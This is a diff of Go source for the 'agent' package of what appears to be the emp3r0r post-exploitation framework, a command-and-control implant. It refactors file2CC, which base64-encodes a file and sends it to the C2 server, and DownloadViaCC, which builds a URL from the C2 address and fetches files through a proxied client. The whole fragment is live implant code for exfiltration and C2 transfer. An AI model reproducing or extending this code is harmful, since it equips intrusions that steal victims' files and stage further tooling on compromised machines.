@@ -1,6 +1,3 @@
-//go:build linux
-// +build linux
-
 package agent
 
 import (
@@ -8,6 +5,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"log"
+	"net/url"
 	"os"
 	"time"
 
@@ -36,8 +34,8 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 	payload := base64.StdEncoding.EncodeToString(bytes)
 
 	fileData := emp3r0r_data.MsgTunData{
-		Payload: "FILE" + emp3r0r_data.OpSep + filepath + emp3r0r_data.OpSep + payload,
-		Tag:     emp3r0r_data.AgentTag,
+		Payload: "FILE" + emp3r0r_data.MagicString + filepath + emp3r0r_data.MagicString + payload,
+		Tag:     RuntimeConfig.AgentTag,
 	}
 
 	// send
@@ -46,7 +44,9 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 
 // DownloadViaCC download via EmpHTTPClient
 // if path is empty, return []data instead
-func DownloadViaCC(url, path string) (data []byte, err error) {
+func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
+	url := fmt.Sprintf("%s%s/%s?file_to_download=%s",
+		emp3r0r_data.CCAddress, tun.FileAPI, url.QueryEscape(RuntimeConfig.AgentTag), url.QueryEscape(file_to_download))
 	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
 	retData := false
 	if path == "" {
@@ -56,7 +56,7 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 
 	// use EmpHTTPClient
 	client := grab.NewClient()
-	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.AgentProxy)
+	client.HTTPClient = tun.EmpHTTPClient(RuntimeConfig.AgentProxy)
 
 	req, err := grab.NewRequest(path, url)
 	if err != nil {
@@ -74,7 +74,7 @@ func DownloadViaCC(url, path string) (data []byte, err error) {
 		t.Stop()
 		if !retData && !util.IsFileExist(path) {
 			data = nil
-			err = fmt.Errorf("%s not found, download failed", path)
+			err = fmt.Errorf("Target file '%s' does not exist, downloading from CC may have failed", path)
 		}
 	}()
 	for !resp.IsComplete() {
